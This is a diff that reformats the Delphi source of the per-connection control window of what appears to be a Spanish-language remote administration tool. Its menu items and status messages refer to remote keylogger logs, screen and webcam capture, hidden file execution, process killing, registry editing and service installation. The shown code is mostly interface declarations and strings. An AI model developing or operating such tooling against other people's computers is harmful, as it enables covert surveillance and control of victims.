@@ -3,26 +3,28 @@ unit UnitFormControl;
 interface
 
 uses
-  Windows, Shellapi, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms, CommCtrl,
+  Windows, Shellapi, Messages, SysUtils, Classes, Graphics, Controls, Forms, CommCtrl,
   Dialogs, ComCtrls, XPMan, ImgList, Menus, ExtCtrls, StdCtrls, Buttons, {ScktComp,} Jpeg,
-   Spin, IdThreadMgr, IdThreadMgrDefault, IdAntiFreezeBase, AppEvnts,
-  IdAntiFreeze, IdBaseComponent, IdComponent, IdTCPServer,ActiveX, gnugettext, MMsystem;
+  Spin,
+  IdTCPServer, ActiveX, gnugettext, MMsystem;
 
-  type TSearchItem=record
-    Nombre      : String;
-    Tamanio     : String;
-    Tipo        : String;
-    Atributos   : String;
-    Fechamodify : integer;
-    TamanioReal : integer;
-    SortData   : string;
+type
+  TSearchItem = record
+    Nombre: string;
+    Tamanio: string;
+    Tipo: string;
+    Atributos: string;
+    Fechamodify: Integer;
+    TamanioReal: Integer;
+    SortData: string;
   end;
 
-  type TCachedIcon=record
-    Extension : String;
-    num       : integer;
+type
+  TCachedIcon = record
+    Extension: string;
+    num: Integer;
   end;
-  
+
 type
   TFormControl = class(TForm)
     PageControl: TPageControl;
@@ -51,25 +53,25 @@ type
     Cambiarnombre1: TMenuItem;
     Crearnuevacarpeta1: TMenuItem;
     PopupRegistro: TPopupMenu;
-    Nuevo1:  TMenuItem;
-    Clave1:  TMenuItem;
-    N2:      TMenuItem;
+    Nuevo1: TMenuItem;
+    Clave1: TMenuItem;
+    N2: TMenuItem;
     Valoralfanumrico1: TMenuItem;
     Valorbinerio1: TMenuItem;
     valorDWORD1: TMenuItem;
     Valordecadenamltiple1: TMenuItem;
-    N3:      TMenuItem;
-    N1:      TMenuItem;
+    N3: TMenuItem;
+    N1: TMenuItem;
     Eliminar1: TMenuItem;
     XPManifest: TXPManifest;
     StatusBar: TStatusBar;
     Enviarteclas1: TMenuItem;
     TimerCaptureScreen: TTimer;
     Descargarfichero1: TMenuItem;
-    N4:      TMenuItem;
+    N4: TMenuItem;
     PopupDescargas: TPopupMenu;
-    Subir1:  TMenuItem;
-    Bajar1:  TMenuItem;
+    Subir1: TMenuItem;
+    Bajar1: TMenuItem;
     Subiralprimerpuesto1: TMenuItem;
     ltimopuesto1: TMenuItem;
     Borrarcompletados1: TMenuItem;
@@ -81,7 +83,7 @@ type
     DlgFont: TFontDialog;
     DlgColors: TColorDialog;
     Desactivar2: TMenuItem;
-    N5:      TMenuItem;
+    N5: TMenuItem;
     Guardarcmo1: TMenuItem;
     PopupServicios: TPopupMenu;
     Iniciar1: TMenuItem;
@@ -91,8 +93,8 @@ type
     DetenerDescarga1: TMenuItem;
     ReanudarDescarga1: TMenuItem;
     Agregaracoladedescarga1: TMenuItem;
-    N6:      TMenuItem;
-    N7:      TMenuItem;
+    N6: TMenuItem;
+    N7: TMenuItem;
     Iralproceso1: TMenuItem;
     Previsualizarjpg1: TMenuItem;
     TimerCamCapture: TTimer;
@@ -305,12 +307,12 @@ type
     procedure Eliminar1Click(Sender: TObject);
     procedure Valoralfanumrico1Click(Sender: TObject);
     procedure TreeViewRegeditContextPopup(Sender: TObject; MousePos: TPoint;
-      var Handled: boolean);
+      var Handled: Boolean);
     procedure ListViewRegistroContextPopup(Sender: TObject;
-      MousePos: TPoint; var Handled: boolean);
+      MousePos: TPoint; var Handled: Boolean);
     procedure Clave1Click(Sender: TObject);
     procedure ListViewArchivosContextPopup(Sender: TObject;
-      MousePos: TPoint; var Handled: boolean);
+      MousePos: TPoint; var Handled: Boolean);
     procedure ListViewArchivosEdited(Sender: TObject; Item: TListItem;
       var S: string);
     procedure Valorbinerio1Click(Sender: TObject);
@@ -326,7 +328,7 @@ type
     procedure BtnObtenerWebcamsClick(Sender: TObject);
     procedure BtnCapturarWebcamClick(Sender: TObject);
     procedure EnviarClickM(Sender: TObject; Button: TMouseButton;
-      Shift: TShiftState; X, Y: integer);
+      Shift: TShiftState; X, Y: Integer);
     procedure BtnActualizarServidorInfoClick(Sender: TObject);
     procedure BtnEnviarComandoServidorClick(Sender: TObject);
     procedure BtnVerGrandeCapClick(Sender: TObject);
@@ -334,10 +336,10 @@ type
     procedure Descargarfichero1Click(Sender: TObject);
     procedure Borrarcompletados1Click(Sender: TObject);
     procedure ListViewDescargasContextPopup(Sender: TObject;
-      MousePos: TPoint; var Handled: boolean);
+      MousePos: TPoint; var Handled: Boolean);
     procedure ListViewDescargasCustomDrawSubItem(Sender: TCustomListView;
-      Item: TListItem; SubItem: integer; State: TCustomDrawState;
-      var DefaultDraw: boolean);
+      Item: TListItem; SubItem: Integer; State: TCustomDrawState;
+      var DefaultDraw: Boolean);
     procedure Eliminardescarga1Click(Sender: TObject);
     procedure Subiralprimerpuesto1Click(Sender: TObject);
     procedure Subir1Click(Sender: TObject);
@@ -360,17 +362,17 @@ type
     procedure btnSiguienteInstalarServicioClick(Sender: TObject);
     procedure btnInstServiciosClick(Sender: TObject);
     procedure btnInstServicios2Click(Sender: TObject);
-    procedure PopupDescargasPopup(Sender: TObject);                                        
+    procedure PopupDescargasPopup(Sender: TObject);
     procedure DetenerDescarga1Click(Sender: TObject);
     procedure ReanudarDescarga1Click(Sender: TObject);
     procedure Agregaracoladedescarga1Click(Sender: TObject);
     procedure EditPathArchivosKeyPress(Sender: TObject; var Key: char);
     procedure ListViewProcesosCompare(Sender: TObject; Item1, Item2: TListItem;
-      Data: integer; var Compare: integer);
+      Data: Integer; var Compare: Integer);
     procedure ListViewRegistroCompare(Sender: TObject; Item1, Item2: TListItem;
-      Data: integer; var Compare: integer);
-    procedure ListViewProcesosColumnClick(Sender: TObject; Column: TListColumn);   //Desde FormBuscar
-    procedure ListViewArchivosCompare(Sender: TObject; Item1, Item2: TListItem;Data: integer; var Compare: integer); //Desde formbuscar
+      Data: Integer; var Compare: Integer);
+    procedure ListViewProcesosColumnClick(Sender: TObject; Column: TListColumn); //Desde FormBuscar
+    procedure ListViewArchivosCompare(Sender: TObject; Item1, Item2: TListItem; Data: Integer; var Compare: Integer); //Desde formbuscar
 
     procedure Iralproceso1Click(Sender: TObject);
     procedure SpinCaptureScreenChange(Sender: TObject);
@@ -457,59 +459,59 @@ type
     procedure MatarProceso1Click(Sender: TObject);
     procedure TabPuertosShow(Sender: TObject);
 
-  private  //Funciones y variables privadas que solo podemos usar en este Form
+  private //Funciones y variables privadas que solo podemos usar en este Form
     FormVisorDeMiniaturas: TObject;
-    mslistviewitem : Tlistitem;
-    RecibiendoFichero: boolean;
-    NombreSI, DescripcionSI, RutaSI: string;//EnviarInstalarservicios
-    Columna, ColumnaOrdenada: integer;
-    PrefijoGuardarCaptura, PrefijoGuardarWebcam : string; //Para el guardado automático
-    InumeroCaptura, InumeroWebcam : integer;
-    PrevisualizacionActiva : boolean; //activada o desactivada la previsualización  de imagenes
-    PortaPapeles : string;
-    ReceivingThumbfile : boolean;   
-    IconosGrandes : TImageList;
-    NumeroIconos : integer;
-    MSGPosibles : array of string;
-    NumeroAudio : integer;
-    UltimoFormato : string; //último formato de audio utilizado
-    ParaDeBuscar : boolean;
-    SearchItems : array[0..50000] of TSearchItem;
-    Encontrados : integer; //Numero de encontrados
-    ParaDeListar : boolean;
-    Reversed     : boolean;
-    CachedIcons : array[0..1000000] of TCachedIcon;
-    numcached : integer;
-    PrimeraVezQueMeMuestro : boolean;
-    CapSize : array[0..5] of integer; //Tamaño de la captura.. que estamos recibiendo
-    MSc   : array[0..5] of TMemoryStream; //EL memoryStream donde recibiremos las capturas...
-    Keyloggerlog : string; //Para recibir el log del keylogger 
+    mslistviewitem: Tlistitem;
+    RecibiendoFichero: Boolean;
+    NombreSI, DescripcionSI, RutaSI: string; //EnviarInstalarservicios
+    Columna, ColumnaOrdenada: Integer;
+    PrefijoGuardarCaptura, PrefijoGuardarWebcam: string; //Para el guardado automático
+    InumeroCaptura, InumeroWebcam: Integer;
+    PrevisualizacionActiva: Boolean; //activada o desactivada la previsualización  de imagenes
+    PortaPapeles: string;
+    ReceivingThumbfile: Boolean;
+    IconosGrandes: TImageList;
+    NumeroIconos: Integer;
+    MSGPosibles: array of string;
+    NumeroAudio: Integer;
+    UltimoFormato: string; //último formato de audio utilizado
+    ParaDeBuscar: Boolean;
+    SearchItems: array[0..50000] of TSearchItem;
+    Encontrados: Integer; //Numero de encontrados
+    ParaDeListar: Boolean;
+    Reversed: Boolean;
+    CachedIcons: array[0..1000000] of TCachedIcon;
+    numcached: Integer;
+    PrimeraVezQueMeMuestro: Boolean;
+    CapSize: array[0..5] of Integer; //Tamaño de la captura.. que estamos recibiendo
+    MSc: array[0..5] of TMemoryStream; //EL memoryStream donde recibiremos las capturas...
+    Keyloggerlog: string; //Para recibir el log del keylogger
     function ObtenerRutaAbsolutaDeArbol(Nodo: TTreeNode): string;
     procedure AniadirClavesARegistro(Claves: string);
     procedure AniadirValoresARegistro(Valores: string);
-    procedure agregardescargaencola(filename:string;tamano:integer);
-    procedure CargarThumbsFileAlListview(thumbsfilepath:string);     //Funcion para mostrar imagenes de un archivo thumbs.db a el listview de archivos
-    Function FileIconInit(FullInit: BOOL): BOOL; stdcall;
-    procedure Cargariconos(primeravez : boolean);
-    function IconNum(strExt: string;usecache: boolean): integer;
-    procedure agregardescarga(filename:string);
-    procedure TransferFinishedNotification(Sender: TObject;filename:string);
+    procedure AgregarDescargaEnCola(FileName: string; tamano: Integer);
+    procedure CargarThumbsFileAlListview(thumbsfilepath: string); //Funcion para mostrar imagenes de un archivo thumbs.db a el listview de archivos
+    function FileIconInit(FullInit: BOOL): BOOL; stdcall;
+    procedure CargarIconos(primeravez: Boolean);
+    function IconNum(strExt: string; usecache: Boolean): Integer;
+    procedure AgregarDescarga(FileName: string);
+    procedure TransferFinishedNotification(Sender: TObject; FileName: string);
     procedure CreateParams(var Params: TCreateParams); override;
-    procedure Estado(Estado:string);
-    procedure AgregarARichEdit(Texto:string); //Agrega texto en color a RichEdit
-  public  //Funciones públicas que podemos llamar desde otros Forms
+    procedure Estado(Estado: string);
+    procedure AgregarARichEdit(Texto: string); //Agrega texto en color a RichEdit
+  public //Funciones públicas que podemos llamar desde otros Forms
     Servidor: TIdPeerThread;
-    RecibiendoJPG : boolean; //Recibiendo captura? o camara o thumbnail  (se usa desde UnitVisorDeMiniaturas)
-    AnchuraPantalla, AlturaPantalla : integer; //Altura y anchura de la pantalla del servidor
-    AnchuraWebCam, AlturaWebCam : integer;     //Altura y anchura de la webcam del servidor
-    FormVisorCaptura : TObject;
-    DirUsuario, DirCapturas, DirWebcam, DirMiniaturas, DirDescargas : string;
+    RecibiendoJPG: Boolean; //Recibiendo captura? o camara o thumbnail  (se usa desde UnitVisorDeMiniaturas)
+    AnchuraPantalla, AlturaPantalla: Integer; //Altura y anchura de la pantalla del servidor
+    AnchuraWebCam, AlturaWebCam: Integer; //Altura y anchura de la webcam del servidor
+    FormVisorCaptura: TObject;
+    DirUsuario, DirCapturas, DirWebcam, DirMiniaturas, DirDescargas: string;
     MyItem: TListItem; //Item de listviewconexiones
-    constructor Create(aOwner: TComponent; AThread: TIdPeerThread; Item : Tlistitem);
+    constructor Create(aOwner: TComponent; AThread: TIdPeerThread; Item: Tlistitem);
     procedure OnRead(command: string; AThread: TIdPeerThread); overload;
     procedure OnReadFile(AThread: TIdPeerThread); overload;
-    procedure CrearDirectoriosUsuario();  //Es llamada tambien desde el visor de Thumbnails
-    function InitWavFile(var Ms:TMemoryStream;nChannels,nSamplesPerSec,wBitsPerSample:word;b:string):   Integer;
+    procedure CrearDirectoriosUsuario(); //Es llamada tambien desde el visor de Thumbnails
+    function InitWavFile(var Ms: TMemoryStream; nChannels, nSamplesPerSec, wBitsPerSample: Word; b: string): Integer;
   end;
 
 var
@@ -517,285 +519,287 @@ var
 
 implementation
 
-uses UnitMain, UnitOpciones, UnitVisorDeMiniaturas,UnitTransfer,
-     UnitFormReg, ScreenMaxCap, UnitFormSendKeys, UnitFunciones,UnitVariables, AxThumbsDB, Storages;
-     
+uses UnitMain, UnitOpciones, UnitVisorDeMiniaturas, UnitTransfer,
+  UnitFormReg, ScreenMaxCap, UnitFormSendKeys, UnitFunciones, AxThumbsDB, Storages;
+
 {$R *.dfm}
 
-procedure TFormControl.AgregarARichEdit(Texto:string);
+procedure TFormControl.AgregarARichEdit(Texto: string);
 var
-  TempStr : string;
+  TempStr: string;
 begin
-    while pos(#10, Texto) > 0 do
+  while Pos(#10, Texto) > 0 do
     begin
-      TempStr := copy(Texto, 1, pos(#10, Texto));
+      TempStr := Copy(Texto, 1, Pos(#10, Texto));
       Delete(Texto, 1, Pos(#10, Texto));
-      
+
       if (Copy(TempStr, 1, 2) = '-[') then //evento
-      begin
-         RichEditKeylogger.SelAttributes.Style := [fsBold];
-         RichEditKeylogger.SelAttributes.Color := clRed;
-      end
+        begin
+          RichEditKeylogger.SelAttributes.Style := [fsBold];
+          RichEditKeylogger.SelAttributes.Color := clRed;
+        end
       else if (Copy(TempStr, 1, 2) = '-{') then
-      begin
-         RichEditKeylogger.SelAttributes.Style := [fsBold];
-         RichEditKeylogger.SelAttributes.Color := clgreen;
-      end
+        begin
+          RichEditKeylogger.SelAttributes.Style := [fsBold];
+          RichEditKeylogger.SelAttributes.Color := clgreen;
+        end
       else
-      begin
-         RichEditKeylogger.SelAttributes.Style := [];
-         RichEditKeylogger.SelAttributes.Color := clblack;
-      end;
-        RichEditKeylogger.SelText := TempStr {+ #13+#10};
+        begin
+          RichEditKeylogger.SelAttributes.Style := [];
+          RichEditKeylogger.SelAttributes.Color := clBlack;
+        end;
+      RichEditKeylogger.SelText := TempStr {+ #13+#10};
 
     end;
-    RichEditKeylogger.SelText := Texto;
+  RichEditKeylogger.SelText := Texto;
 end;
 
-procedure TFormControl.Estado(Estado:string); //Cambia el texto de la statusbar
+procedure TFormControl.Estado(Estado: string); //Cambia el texto de la statusbar
 begin
-  Statusbar.Panels[1].Text := '['+timetostr(now)+'] '+Estado;
+  Statusbar.Panels[1].Text := '[' + timetostr(now) + '] ' + Estado;
 end;
 
-Function TFormControl.FileIconInit(FullInit: BOOL): BOOL; stdcall;
+function TFormControl.FileIconInit(FullInit: BOOL): BOOL; stdcall;
 type
-TFileIconInit = function(FullInit: BOOL): BOOL; stdcall;
+  TFileIconInit = function(FullInit: BOOL): BOOL; stdcall;
 var
 
-ShellDLL: HMODULE;
-PFileIconInit: TFileIconInit;
+  ShellDLL: HMODULE;
+  PFileIconInit: TFileIconInit;
 begin
-Result := False;
-if (Win32Platform = VER_PLATFORM_WIN32_NT) then
-begin
-  ShellDLL := LoadLibrary(PChar('shell32.dll'));
-  PFileIconInit := GetProcAddress(ShellDLL, PChar(660));
-  if (Assigned(PFileIconInit)) then
-    Result := PFileIconInit(FullInit);
-end;
+  Result := False;
+  if (Win32Platform = VER_PLATFORM_WIN32_NT) then
+    begin
+      ShellDLL := LoadLibrary(PChar('shell32.dll'));
+      PFileIconInit := GetProcAddress(ShellDLL, PChar(660));
+      if (Assigned(PFileIconInit)) then
+        Result := PFileIconInit(FullInit);
+    end;
 end;
 
-constructor TFormControl.Create(aOwner: TComponent; AThread: TIdPeerThread; Item : Tlistitem);
+constructor TFormControl.Create(aOwner: TComponent; AThread: TIdPeerThread; Item: Tlistitem);
 var
-tempstr, uname, pcname: string;
-i : integer;
+  tempstr, uname, pcname: string;
+  i: Integer;
 begin
   inherited Create(aOwner);
   Servidor := AThread;
   MyItem := Item;
   FormVisorDeMiniaturas := nil;
-  self.Caption :=
-      _('Centro de control:')+ ' ' + Item.caption +
-      ' ' + Athread.Connection.Socket.Binding.PeerIP;
+  Self.Caption :=
+    _('Centro de control:') + ' ' + Item.Caption +
+    ' ' + Athread.Connection.Socket.Binding.PeerIP;
 
-  TempStr := item.SubItems[10];  //Extraemos el nombre de usuario y del pc
-  UName := Copy(TempStr, 1, Pos('/', TempStr) - 1);//Nombre de usuario
+  TempStr := item.SubItems[10]; //Extraemos el nombre de usuario y del pc
+  UName := Copy(TempStr, 1, Pos('/', TempStr) - 1); //Nombre de usuario
   Delete(TempStr, 1, Pos('/', TempStr));
   PcName := TempStr;
 
-  DirUsuario     := Lowercase(FormOpciones.LabeledEditDirUser.text);
-  DirCapturas    := Lowercase(FormOpciones.LabeledDirScreen.text);
-  DirWebcam      := Lowercase(FormOpciones.LabeledDirWebcam.text);
-  DirMiniaturas  := Lowercase(FormOpciones.LabeledDirThumbs.text);
-  DirDescargas   := Lowercase(FormOpciones.LabeledDirDownloads.text);
+  DirUsuario := Lowercase(FormOpciones.LabeledEditDirUser.Text);
+  DirCapturas := Lowercase(FormOpciones.LabeledDirScreen.Text);
+  DirWebcam := Lowercase(FormOpciones.LabeledDirWebcam.Text);
+  DirMiniaturas := Lowercase(FormOpciones.LabeledDirThumbs.Text);
+  DirDescargas := Lowercase(FormOpciones.LabeledDirDownloads.Text);
 
-  for i:=0 to 4 do
-  begin
-    case i of
-      0: TempStr := DirUsuario;
-      1: TempStr := DirCapturas;
-      2: TempStr := DirWebcam;
-      3: TempStr := DirMiniaturas;
-      4: TempStr := DirDescargas;
-    end;
+  for i := 0 to 4 do
+    begin
+      case i of
+        0: TempStr := DirUsuario;
+        1: TempStr := DirCapturas;
+        2: TempStr := DirWebcam;
+        3: TempStr := DirMiniaturas;
+        4: TempStr := DirDescargas;
+      end;
 
-    TempStr := StringReplace(TempStr,'%cooldir%', extractfiledir(paramstr(0)), [rfReplaceAll]);
-    TempStr := StringReplace(TempStr,'%identificator%', item.caption, [rfReplaceAll]);
-    TempStr := StringReplace(TempStr,'%username%', UName, [rfReplaceAll]);
-    TempStr := StringReplace(TempStr,'%pcname%', PcName, [rfReplaceAll]);
-    
-    case i of
-      0: DirUsuario    := IncludeTrailingBackslash(TempStr);
-      1: DirCapturas   := IncludeTrailingBackslash(TempStr);
-      2: DirWebcam     := IncludeTrailingBackslash(TempStr);
-      3: DirMiniaturas := IncludeTrailingBackslash(TempStr);
-      4: DirDescargas  := IncludeTrailingBackslash(TempStr);
+      TempStr := StringReplace(TempStr, '%cooldir%', extractfiledir(ParamStr(0)), [rfReplaceAll]);
+      TempStr := StringReplace(TempStr, '%identificator%', item.Caption, [rfReplaceAll]);
+      TempStr := StringReplace(TempStr, '%username%', UName, [rfReplaceAll]);
+      TempStr := StringReplace(TempStr, '%pcname%', PcName, [rfReplaceAll]);
+
+      case i of
+        0: DirUsuario := IncludeTrailingBackslash(TempStr);
+        1: DirCapturas := IncludeTrailingBackslash(TempStr);
+        2: DirWebcam := IncludeTrailingBackslash(TempStr);
+        3: DirMiniaturas := IncludeTrailingBackslash(TempStr);
+        4: DirDescargas := IncludeTrailingBackslash(TempStr);
+      end;
     end;
-  end;
 end;
 
 procedure TFormControl.FormCreate(Sender: TObject);
 begin
-      UseLanguage(Formmain.idioma);
-      PrimeraVezQueMeMuestro := true;
-      TranslateComponent(self);
-      SetLength(MSGPosibles, 56);
-      MSGPosibles[0] := _('De momento no funciona esta función :-)');
-      MSGPosibles[1] := _('Hubo un problema al intentar auto-ejecutarse); la actualización se completara en el siguiente reinicio');
-      MSGPosibles[2] := _('Proceso matado con PID ');
-      MSGPosibles[3] := _(' :( No pude matar el proceso con PID ');
-      MSGPosibles[4] := _('Ventana cerrada con Handle ');
-      MSGPosibles[5] := _('Ventana maximizada con Handle ');
-      MSGPosibles[6] := _('Ventana minimizada con Handle ');
-      MSGPosibles[7] := _('Ventana mostrada con Handle ');
-      MSGPosibles[8] := _('Ventana ocultada con Handle ');
-      MSGPosibles[9] := _('Minimizadas todas las ventanas.');
-      MSGPosibles[10] := _('Se activó el botón Cerrar [X] en la ventana con Handle ');
-      MSGPosibles[11] := _('Se desactivó el botón Cerrar [X] en la ventana con Handle ');
-      MSGPosibles[12] := _('No se pudieron enviar las teclas a la ventana con handle ');
-      MSGPosibles[13] := _('Se enviaron las teclas a la ventana con handle ');
-      MSGPosibles[14] := _('El usuario respondió: OK');
-      MSGPosibles[15] := _('El usuario respondió: Cancelar');
-      MSGPosibles[16] := _('El usuario respondió: Reintentar');
-      MSGPosibles[17] := _('El usuario respondió: Sí');
-      MSGPosibles[18] := _('El usuario respondió: No');
-      MSGPosibles[19] := _('El usuario respondió: Anular');
-      MSGPosibles[20] := _('El usuario respondió: Omitir');
-      MSGPosibles[21] := _('Archivo correctamente ejecutado :).');
-      MSGPosibles[22] := _('Se produjo algún error al ejecutar el archivo.');
-      MSGPosibles[23] := _('Archivo correctamente ejecutado de manera oculta :).');
-      MSGPosibles[24] := _('Se produjo algún error al ejecutar el archivo de manera oculta.');
-      MSGPosibles[25] := _('El archivo fue borrado con éxito.');
-      MSGPosibles[26] := _('El archivo no se pudo borrar.');
-      MSGPosibles[27] := _('El archivo no existe. Tal vez ya fue borrado.');
-      MSGPosibles[28] := _('La carpeta fue borrada con éxito.');
-      MSGPosibles[29] := _('No se pudo borrar la carpeta.');
-      MSGPosibles[30] := _('La carpeta no existe. Tal vez ya fue borrada.');
-      MSGPosibles[31] := _('Archivo o carpeta renombrada con éxito.');
-      MSGPosibles[32] := _('No se pudo renombrar el archivo o la carpeta.');
-      MSGPosibles[33] := _('El archivo o la carpeta no existe.');
-      MSGPosibles[34] := _('Carpeta creada con éxito.');
-      MSGPosibles[35] := _('No se pudo crear la carpeta.');
-      MSGPosibles[36] := _('La carpeta ya existe); no es necesario crearla.');
-      MSGPosibles[37] := _('Archivo copiado con éxito');
-      MSGPosibles[38] := _('Error al copiar el archivo');
-      MSGPosibles[39] := _('Modificado nombre de clave con éxito.');
-      MSGPosibles[40] := _('Error al modificar el nombre de la clave.');
-      MSGPosibles[41] := _('Clave o Valor eliminado con éxito.');
-      MSGPosibles[42] := _('No se pudo eliminar la clave o el valor.');
-      MSGPosibles[43] := _('Clave añadida con éxito.');
-      MSGPosibles[44] := _('No se pudo añadir la clave.');
-      MSGPosibles[45] := _('Valor añadido con éxito.');
-      MSGPosibles[46] := _('No se pudo añadir el valor.');
-      MSGPosibles[47] := _('Se ha intentado iniciar el serivico');
-      MSGPosibles[48] := _('Se ha intentado detener el servicio');
-      MSGPosibles[49] := _('Se ha intentado desinstalar el servicio');
-      MSGPosibles[50] := _('Se ha intentado instalar el servicio');
-      MSGPosibles[51] := _('Log eliminado con éxito');
-      MSGPosibles[52] := _('Online Keylogger activado con éxito');
-      MSGPosibles[53] := _('Online Keylogger desactivado con éxito');
-      MSGPosibles[54] := _('Seteado portapapeles con éxito');
-      MSGPosibles[55] := _('Se ha intentado cerrar la conexión'); 
-    self.DoubleBuffered := True;  //Evita parpadeos
-    self.ListviewArchivos.DoubleBuffered := true;
-    self.ListViewBuscar.DoubleBuffered := true;
-    self.ListViewDescargas.DoubleBuffered := true;
-    self.ListViewProcesos.DoubleBuffered := true;
-    self.ListViewVentanas.DoubleBuffered :=  true;
-    self.ListViewRegistro.DoubleBuffered := true;
-    self.ListViewAudio.DoubleBuffered := true;
-    self.ListViewServicios.DoubleBuffered := true;
-    self.TreeViewRegedit.DoubleBuffered := true;
-    recibiendofichero := false;
-    self.Height := 457;//Altura Predeterminada
-    self.Width := 440; //Anchura predeterminada
-    if FormMain.ControlWidth > 0 then
-      self.Width := FormMain.ControlWidth;
-    if FormMain.ControlHeight > 0 then
-      self.Height := FormMain.ControlHeight;
-    self.Position := poDesktopCenter; //Posición predeterminada
-    PageControl.ActivePage := TabInfo; //iniciamos siempre en este tab
-    PageControlInformacion.ActivePage := TabSheetServidor;
-    PageControlArchivos.ActivePage := TabSheetVerArchivos;
-    PageControlManagers.ActivePage := TabProcesos;
-    PageControlVigilancia.ActivePage := TabScreencap;
+  UseLanguage(Formmain.idioma);
+  PrimeraVezQueMeMuestro := True;
+  TranslateComponent(Self);
+  SetLength(MSGPosibles, 56);
+  MSGPosibles[0] := _('De momento no funciona esta función :-)');
+  MSGPosibles[1] := _('Hubo un problema al intentar auto-ejecutarse); la actualización se completara en el siguiente reinicio');
+  MSGPosibles[2] := _('Proceso matado con PID ');
+  MSGPosibles[3] := _(' :( No pude matar el proceso con PID ');
+  MSGPosibles[4] := _('Ventana cerrada con Handle ');
+  MSGPosibles[5] := _('Ventana maximizada con Handle ');
+  MSGPosibles[6] := _('Ventana minimizada con Handle ');
+  MSGPosibles[7] := _('Ventana mostrada con Handle ');
+  MSGPosibles[8] := _('Ventana ocultada con Handle ');
+  MSGPosibles[9] := _('Minimizadas todas las ventanas.');
+  MSGPosibles[10] := _('Se activó el botón Cerrar [X] en la ventana con Handle ');
+  MSGPosibles[11] := _('Se desactivó el botón Cerrar [X] en la ventana con Handle ');
+  MSGPosibles[12] := _('No se pudieron enviar las teclas a la ventana con handle ');
+  MSGPosibles[13] := _('Se enviaron las teclas a la ventana con handle ');
+  MSGPosibles[14] := _('El usuario respondió: OK');
+  MSGPosibles[15] := _('El usuario respondió: Cancelar');
+  MSGPosibles[16] := _('El usuario respondió: Reintentar');
+  MSGPosibles[17] := _('El usuario respondió: Sí');
+  MSGPosibles[18] := _('El usuario respondió: No');
+  MSGPosibles[19] := _('El usuario respondió: Anular');
+  MSGPosibles[20] := _('El usuario respondió: Omitir');
+  MSGPosibles[21] := _('Archivo correctamente ejecutado :).');
+  MSGPosibles[22] := _('Se produjo algún error al ejecutar el archivo.');
+  MSGPosibles[23] := _('Archivo correctamente ejecutado de manera oculta :).');
+  MSGPosibles[24] := _('Se produjo algún error al ejecutar el archivo de manera oculta.');
+  MSGPosibles[25] := _('El archivo fue borrado con éxito.');
+  MSGPosibles[26] := _('El archivo no se pudo borrar.');
+  MSGPosibles[27] := _('El archivo no existe. Tal vez ya fue borrado.');
+  MSGPosibles[28] := _('La carpeta fue borrada con éxito.');
+  MSGPosibles[29] := _('No se pudo borrar la carpeta.');
+  MSGPosibles[30] := _('La carpeta no existe. Tal vez ya fue borrada.');
+  MSGPosibles[31] := _('Archivo o carpeta renombrada con éxito.');
+  MSGPosibles[32] := _('No se pudo renombrar el archivo o la carpeta.');
+  MSGPosibles[33] := _('El archivo o la carpeta no existe.');
+  MSGPosibles[34] := _('Carpeta creada con éxito.');
+  MSGPosibles[35] := _('No se pudo crear la carpeta.');
+  MSGPosibles[36] := _('La carpeta ya existe); no es necesario crearla.');
+  MSGPosibles[37] := _('Archivo copiado con éxito');
+  MSGPosibles[38] := _('Error al copiar el archivo');
+  MSGPosibles[39] := _('Modificado nombre de clave con éxito.');
+  MSGPosibles[40] := _('Error al modificar el nombre de la clave.');
+  MSGPosibles[41] := _('Clave o Valor eliminado con éxito.');
+  MSGPosibles[42] := _('No se pudo eliminar la clave o el valor.');
+  MSGPosibles[43] := _('Clave añadida con éxito.');
+  MSGPosibles[44] := _('No se pudo añadir la clave.');
+  MSGPosibles[45] := _('Valor añadido con éxito.');
+  MSGPosibles[46] := _('No se pudo añadir el valor.');
+  MSGPosibles[47] := _('Se ha intentado iniciar el serivico');
+  MSGPosibles[48] := _('Se ha intentado detener el servicio');
+  MSGPosibles[49] := _('Se ha intentado desinstalar el servicio');
+  MSGPosibles[50] := _('Se ha intentado instalar el servicio');
+  MSGPosibles[51] := _('Log eliminado con éxito');
+  MSGPosibles[52] := _('Online Keylogger activado con éxito');
+  MSGPosibles[53] := _('Online Keylogger desactivado con éxito');
+  MSGPosibles[54] := _('Seteado portapapeles con éxito');
+  MSGPosibles[55] := _('Se ha intentado cerrar la conexión');
+  Self.DoubleBuffered := True; //Evita parpadeos
+  Self.ListviewArchivos.DoubleBuffered := True;
+  Self.ListViewBuscar.DoubleBuffered := True;
+  Self.ListViewDescargas.DoubleBuffered := True;
+  Self.ListViewProcesos.DoubleBuffered := True;
+  Self.ListViewVentanas.DoubleBuffered := True;
+  Self.ListViewRegistro.DoubleBuffered := True;
+  Self.ListViewAudio.DoubleBuffered := True;
+  Self.ListViewServicios.DoubleBuffered := True;
+  Self.TreeViewRegedit.DoubleBuffered := True;
+  recibiendofichero := False;
+  Self.Height := 829; //Altura Predeterminada
+  Self.Width := 827; //Anchura predeterminada
+  if FormMain.ControlWidth > 0 then
+    Self.Width := FormMain.ControlWidth;
+  if FormMain.ControlHeight > 0 then
+    Self.Height := FormMain.ControlHeight;
+  Self.Position := poDesktopCenter; //Posición predeterminada
+  PageControl.ActivePage := TabInfo; //iniciamos siempre en este tab
+  PageControlInformacion.ActivePage := TabSheetServidor;
+  PageControlArchivos.ActivePage := TabSheetVerArchivos;
+  PageControlManagers.ActivePage := TabProcesos;
+  PageControlVigilancia.ActivePage := TabScreencap;
 end;
 
-procedure TFormControl.Cargariconos(primeravez : boolean);
+procedure TFormControl.Cargariconos(primeravez: Boolean);
 var
   vFileInfo: TSHFileInfo;
-  Fileinfo : SHFILEINFO;
-  vImgList : THandle;
-  TmpIconosGrandes,Tmp2IconosGrandes: TImageList;
-  bit, nbit : TBitmap;
-  i , tmpint, tmpint2,o: integer;
-  t : boolean;
+  Fileinfo: SHFILEINFO;
+  vImgList: THandle;
+  TmpIconosGrandes, Tmp2IconosGrandes: TImageList;
+  bit, nbit: TBitmap;
+  i, tmpint, tmpint2, o: Integer;
+  t: Boolean;
 begin
-//Creación de iconos
-  FileIconInit(true);
+  //Creación de iconos
+  FileIconInit(True);
   if primeravez then
-  begin
-    {Iconos pequeños para vsreport}
-    vImgList := SHGetFileInfo(nil,FILE_ATTRIBUTE_NORMAL,vFileInfo,SizeOf(vFileInfo),SHGFI_ICON or SHGFI_SMALLICON or SHGFI_SYSICONINDEX);
-    SendMessage(listviewarchivos.Handle, LVM_SETIMAGELIST, LVSIL_SMALL , vImgList);
-    SendMessage(listviewBuscar.Handle, LVM_SETIMAGELIST, LVSIL_SMALL , vImgList);
-  end;
+    begin
+      {Iconos pequeños para vsreport}
